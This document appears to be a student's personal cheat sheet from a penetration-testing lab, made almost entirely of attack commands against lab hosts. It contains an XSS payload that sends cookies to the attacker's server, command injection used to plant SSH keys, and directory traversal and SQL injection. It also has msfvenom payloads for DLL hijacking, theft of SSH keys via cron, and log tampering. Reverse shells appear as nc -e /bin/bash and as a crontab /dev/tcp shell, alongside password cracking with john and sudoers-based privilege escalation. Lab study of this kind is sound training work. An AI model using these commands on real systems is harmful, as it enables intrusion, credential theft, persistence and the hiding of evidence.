## Tunneling/Recon
	•	lin-ops: ssh -MS /tmp/grey student@10.50.29.242
	◦	creates a master socket to the jump box
	◦	will log you into student@jump
	•	lin-ops: ssh -S /tmp/grey dummy -O forward -D9050
	◦	creates a dynamic port
	◦	works the same as networking CANNOT have more than 1 running at a time
	•	lin-ops: ssh -S /tmp/grey dummy -O forward -L5555:192.168.28.120:4242
	◦	creates a local tunnel connected to the /tmp/grey master socket on the jump box for ssh port 4242 on the 192.168.28.120
	•	lin-ops: ssh -S /tmp/grey dummy -O cancel -D9050
	◦	closes the dynamic tunnel
	•	lin-ops: ssh -MS /tmp/black student@127.0.0.1 -p 5555
	◦	creates a master socket through the tunnel connected to the .120 to access the network on the otherside →192.168.150.224/27
	◦	will log you into the student@grey-site-donovia-18
	•	lin-ops: ssh -S /tmp/black dummy -O forward -D9050
	◦	creates a dynamic tunnel for the 192.168.28.120
## Web Exploitation Day 1
	•	lin-ops: proxychains nmap --script banner 10.100.28.40
	•	lin-ops: ssh -S /tmp/grey dummy -O forward -L1111:10.100.28.40:80 -L2222:10.100.28.40:4444
	•	lin-ops: firefox
	◦	http://127.0.0.1:1111
	•	lin-ops: proxychains wget -r http://10.100.28.40
	•	lin-ops: cat 10.100.28.40/robots.txt
	◦	http://127.0.0.1:1111/net_test
## Cookie Stealing
	•	lin-ops: python3 -m http.server
	•	website: <script>document.location=”http://10.50.20.183:8000/”+document.cookie;</script>
	◦	you have to change the quotes in the site or it won’t work
	◦	will send the cookies to the http.server
## SSH Key Upload
	•	lin-ops: ssh-keygen -t rsa -b 4096
	•	; whoami
	◦	discover what user is logged in
	•	; cat /etc/passwd
	◦	find said users home directory to place the key
	•	; mkdir /home/billybob/.ssh
	•	; ls -la /home/billybob
	•	lin-ops: cat id_rsa.pub
	◦	your public key made with ssh-keygen
	•	; echo “” > /home/billybob/.ssh/authorized_keys
	◦	add the public key between the “”
	•	; cat /home/billybob/.ssh/authorized_keys
	◦	confirmation
	•	lin-ops: ssh billybob@127.0.0.1 -p 2222
	◦	port 2222 is my ssh tunnel to the .40
	◦	look around in billybobs directory to find romanoff’s flags
	•	; ls ..
	•	http://127.0.0.1:1111/Contract_bids.html
## Pivot to the .55
	•	lin-ops: ssh -S /tmp/grey dummy -O cancel -D9050
	•	closes dynamic tunnel to the .40
	•	lin-ops: ssh -MS /tmp/black billybob@127.0.0.1 -p 2222
	◦	logs you into billybob on the .55 using your tunnel
	•	lin-ops: ssh -S /tmp/black dummy -O forward -D9050
	◦	creates a new dynamic tunnel for .55
	•	lin-ops: ssh -S /tmp/black dummy -O forward -L3333:10.100.28.55:80
	•	http://127.0.0.1:3333
	•	F12
	◦	look in inspector and find the function
	◦	go into console and call the function
	▪	press enter
## Directory Traversal
	•	127.0.0.1/books.html
	◦	once you press “Submit Query” at the end of the url will be the “book=net”
	▪	the net portion is specifying the file that you’re pulling
	•	127.0.0.1/books_pick.php?books=../../../../../../etc/passwd
	◦	you can go back in the directories as many time as you’d like and eventually you will get to the root of the files system
## Linux Exploitation
	•	Run everything from demo
	◦	use msfvenom to make changing cmds quicker
	◦	need to run gdb part on actual box you are running the .exe to get the correct EIP values
	◦	msfvenom -p linux/x86/exec CMD="cat /.secret/.verysecret.pdb" -b '\x00' -f python
	•	sudo -l 
	◦	will tell what things you have elevated privileges on 
	▪	you have elevated privileges in /.hidden folder
	▪	means you can run sudo there
	•	/.hidden/inventory.exe <<<$(/tmp/./elf_buf.py)
	◦	gets permission denied but works
	•	sudo /.hidden/inventory.exe <<<$(/tmp/./elf_buf.py)
	◦	sudo gets you the flag
## Post Exploitation
	•	Extranet
	◦	ssh -S /tmp/grey dummy -O forward -L1111:192.168.28.100:80 -L2222:192.168.28.100:2222
	◦	proxychains nmap -Pn -T4 -sT --script=http-enum 192.168.28.100
	◦	firefox http://127.0.0.1:1111/admin/
	◦	Hacker’ OR 1=’
	▪	takes you to a site to input commands
	▪	; cat /etc/hosts
	▪	; whoami
	▪	; cat /etc/passwd
	▪	/var/www
	▪	lin-ops: ssh-keygen -t rsa -b 4096
	▪	; mkdir /var/www/.ssh
	▪	; ls -la /var/www
	▪	lin-ops: cat id_rsa.pub
	▪	; echo “” > /var/www/.ssh/authorized_keys
	▪	; cat /var/www/.ssh/authorized_keys
	▪	lin-ops: ssh www-data@127.0.0.1 -p 2222
	◦	find / -iname *inventory* 2>/dev/null
	◦	cat /etc/crontab
	▪	*  *    * * *   root    tar -C /home/comrade/ -czf /tmp/backup.tar.gz .ssh/
	◦	proxychains scp -P 2222 www-data@192.168.28.100:/tmp/backup.tar.gz .
	◦	mkdir keysineed
	◦	tar -xvzf backup.tar.gz -C keysineed
 
	•	Intranet
	◦	lin-ops: ssh -MS /tmp/black student@127.0.0.1 -p 2222
	◦	lin-ops: ssh -S /tmp/grey dummy -O cancel -D9050
	◦	lin-ops: ssh -S /tmp/black dummy -O forward -D9050
	◦	proxychains nmap -Pn -T4 -sT --script=banner,http-enum 192.168.150.253
	◦	ssh -S /tmp/black dummy -O forward -L3333:192.168.150.253:80
	◦	firefox http://127.0.0.1:3333
	◦	proxychains nmap -T5 192.168.150.253 -p -
	◦	ssh -S /tmp/black dummy -O forward -L4444:192.168.150.253:3201
	◦	ssh -i /home/student/keysineed/.ssh/id_rsa comrade@127.0.0.1 -p 4444
	▪	private key is found on the extranet box and you use it here through your tunnel to log on
	▪	cat /etc/hosts
	▪	cat /etc/rsyslog.conf
	▪	cd /etc/rsyslog.d/
	▪	cat /etc/shadow
	▪	find / -iname *rkhunter* 2>/dev/null
	▪	always cat the config file first
	◦	ssh -MS /tmp/white comrade@127.0.0.1 -p 4444
	▪	probably don’t need this
	◦	sudo scp student@10.50.29.242:/bin/nc .
	◦	sudo tcpdump -i ens3 not src host 192.168.150.253 and not port 3201 -n
	◦	sudo /nc -lvp 12310
 
	•	Internal
	◦	 xfreerdp /u:comrade /v:127.0.0.1:7777 /dynamic-resolution +glyph-cache +clipboard
	◦	C:\Windows\System32
	◦	HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
	▪	PING.EXE 
## Windows Exploitation
	•	ssh -MS /tmp/grey student@10.50.29.242
	•	ssh -S /tmp/grey dummy -O forward -L1111:192.168.28.105:2222 -L2222:192.168.28.105:21
	•	ssh -MS /tmp/black comrade@127.0.0.1 -p 1111
	•	ssh -S /tmp/black dummy -O forward -L8888:192.168.28.5:3389
	•	xfreerdp /u:comrade /v:127.0.0.1:8888 /dynamic-resolution +glyph-cache +clipboard
	•	loading channel cliprdr
	◦	rm -f /home/student/.config/freerdp/known_hosts
	▪	if you get a key error
	•	Check services
	◦	look first for an empty description
	◦	find path
	•	Check if you can write into the directory or rename the executable
	•	To check what account it will use on log on RC the file -> properties -> security
	•	msfvenom -p windows/exec CMD='cmd.exe /C "xcopy C:\Users\Admin\Desktop C:\Users\comrade.WIN2-INTERNAL-D /s"' -f dll > hijackmeplz.dll
	•	scp student@10.50.20.183:/home/student/hijackmeplz.dll “C:\Path to executable\hijackmeplz.dll”
## Linux Exploitation
	•	Log Cleaning
	◦	grep '21:51:32|10:02:15' auth.log > auth.log2
	◦	sed -i 's/172.16.34.4/192.168.1.103/g' auth.log2
	◦	md5sum auth.log2
	•	ssh -MS /tmp/grey student@10.50.29.242
	•	ssh -S /tmp/grey dummy -O forward -L1111:192.168.28.105:2222
	•	ssh -MS /tmp/black comrade@127.0.0.1 -p 1111
	•	ssh -S /tmp/black dummy -O forward -D9050
	•	proxychains nmap -T5 192.168.28.12 -p -
	•	ssh -S /tmp/black dummy -O forward -L2222:192.168.28.27:22
	•	ssh -S /tmp/black dummy -O forward -L2222:192.168.28.12:22
	•	ssh -X comrade@127.0.0.1 -p 2222
	◦	vim /var/tmp/ls and in /tmp/ls
	▪	#!/bin/bash
	▪	nc 10.50.20.183 6789 -e /bin/bash
	◦	chmod +x both scripts
	◦	open a nc on lin-ops
	▪	nc -lvp 6789
	•	/usr/sbin/john --wordlist=words.txt shadow.txt
	•	/usr/sbin/john --show shadow.txt
	•	ssh -X zeus@127.0.0.1 -p 2222
	•	crontab -e
	◦	* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.28.135/33403 0>&1'
	◦	ls  /tmp
	•	find / -type f -perm /6000 -ls 2>/dev/null
	◦	/var/tmp/testbed/unknown
	▪	file unknown to see what it is
	▪	see what the executable is doing by trying to pass arguments to it
	◦	./unknown /etc/sudoers "comrade ALL=(ALL:ALL) ALL"
	▪	add comrade with full permissions to the /etc/sudoers file
	◦	echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
	▪	gtfobins to use at found with the find command to get shell access
